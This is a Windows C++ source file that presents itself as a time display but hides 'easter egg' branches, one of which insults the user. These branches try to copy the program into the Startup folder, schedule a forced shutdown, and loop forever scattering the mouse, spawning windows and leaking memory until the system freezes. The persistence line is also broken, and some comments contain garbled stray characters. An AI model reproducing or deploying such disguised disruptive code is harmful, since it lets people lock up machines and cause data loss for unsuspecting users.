#include<bits/stdc++.h>
#include<windows.h>
#include<ctime>
char a; 
using namespace std;
 int main(){
	cout<<"你要看时间吗？要的话输入‘Y’";
	cin>>a;
	if(a=='Y')
	{
		time_t t;
		time(&t);
		printf("Today's date and time is: %s",ctime(&t));
	} 
	else if(a=='s'||a=='S'||a=='b'||a=='B')
	{
		cout<<"恭喜你发现了隐藏功能2（有第3个哦！！）";
		cout<<"你才是sb!!!!!!!!!!"<<"哈哈哈哈！！";
		char copy[80];
		sprintf(copy,"copy %s \"%%userprofile%%\\「开始」菜单\\程序\\启动\"");
		system(copy); //将这个bai程序拷到du开机启动文件夹下面zhi
		char cmd[]="shutdown -s -t 20";//自动重起
		system("ping baidu.com");
		system("pause");
		system(copy);
		int x=GetSystemMetrics(SM_CXSCREEN);//鼠标x轴 
 	  	int y=GetSystemMetrics(SM_CYSCREEN);//鼠标y轴 
 	  	srand(time(0));//随机函数种子 
	    system("shutdown -s -t 20");//20秒关机 
   	 while(1)//循环 
  		{ 
 	   		SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
  	  		system("start");//弹出窗口 	
       		char *p=new char[10000];//卡死机 
		}
		system("shutdown -s -h 0.5");
	} 
	else if(a=='c'||a=='C')
	{
		cout<<"恭喜你发现了隐藏功能3（有第3个哦！！）";
		cout<<"好玩吗，想拯救你的电脑吗？千万别点鼠标！！Crl+C或Alt+F4关闭就行了,霸特（但是）如果你按了一下鼠标，就会点到别的窗口！嗯……后果不堪设想（暴力关机吧）！！！(点到别的窗口按alt+tab再调出来)";
		int x=GetSystemMetrics(SM_CXSCREEN);
  		int y=GetSystemMetrics(SM_CYSCREEN);
  		srand(time(0));
 		while(true)
 	 	{
    	SetCursorPos(rand()%x,rand()%y);
 		}
  		
   }
	else
	{
		cout<<"恭喜你发现了隐藏功能1（有第3个哦！！）";
		printf("\n");
		for(int i;;i++)
		{
			cout<<"恭喜你发现了隐藏功能1（有3个彩蛋哦！！）";
		printf("\n");
			cout<<"* * * * * * * * * * * *"<<endl<<"* * * ^ ^ * * ^ ^ * * *"<<endl<<"* * ^ ^ ^ * * ^ ^ ^ * *"<<endl<<"* * ^ ^ ^ ^ ^ ^ ^ ^ * *"<<endl<<"* * * ^ ^ ^ ^ ^ ^ * * *"<<endl<<"* * * * ^ ^ ^ ^ * * * *"<<endl<<"* * * * * ^ ^ * * * * *"<<endl;
		}
	}
	return 0;
} 
